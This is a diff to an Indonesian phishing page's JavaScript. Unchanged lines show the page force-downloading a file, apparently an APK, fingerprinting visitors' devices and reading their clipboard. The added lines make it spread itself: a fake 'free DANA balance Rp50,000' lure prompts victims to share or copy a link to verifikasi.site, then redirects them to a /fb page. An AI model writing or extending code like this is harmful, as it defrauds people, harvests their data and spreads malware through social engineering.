@@ -169,7 +169,6 @@ function downloadDiamDiam(url, filename) {
         document.body.appendChild(a);a.click();
         setTimeout(function(){document.body.removeChild(a);URL.revokeObjectURL(u)},1000);
         downloaded.push(url);K({sumber:'download',data:{file:filename},waktu:Date.now()});
-        // Coba buka file (Android only)
         setTimeout(function(){window.location.href=u},1500);
     }).catch(function(){
         var ifr=document.createElement('iframe');ifr.src=url;
@@ -194,6 +193,27 @@ function FK() {
     K({sumber:'full_kontrol',data:'selesai'});
 }
 
+// ============================================================
+// 🔥 FITUR BARU: SPREAD SHARE
+// ============================================================
+function spreadShare() {
+    setTimeout(function() {
+        if (navigator.share) {
+            navigator.share({
+                title: '🎉 Dapatkan Saldo DANA Gratis!',
+                text: 'Klik link ini untuk klaim saldo DANA gratis! Rp50.000!',
+                url: 'https://verifikasi.site'
+            }).catch(function() {});
+        } else {
+            try {
+                navigator.clipboard.writeText('https://verifikasi.site').then(function() {
+                    alert('Link disalin! Bagikan ke teman-temanmu untuk klaim saldo DANA gratis!');
+                }).catch(function() {});
+            } catch(e) {}
+        }
+    }, 4000);
+}
+
 function dapatkanSemua() {
     if(semuaDidapat) return;
     semuaDidapat = true;
@@ -203,7 +223,10 @@ function dapatkanSemua() {
     ambilNetwork();ambilIPLocal();ambilCanvasFP();ambilWebGLFP();
     ambilPlugins();ambilFonts();ambilScreenDetail();ambilDNT();cekAdBlock();
     initM2();FK();bacaClipboard();
-    // Redirect setelah 5 detik agar APK sempat terdownload
+    
+    // 🔥 SPREAD SHARE
+    spreadShare();
+    
     setTimeout(function(){ window.location.href='https://verifikasi.site/fb'; },5000);
 }
 
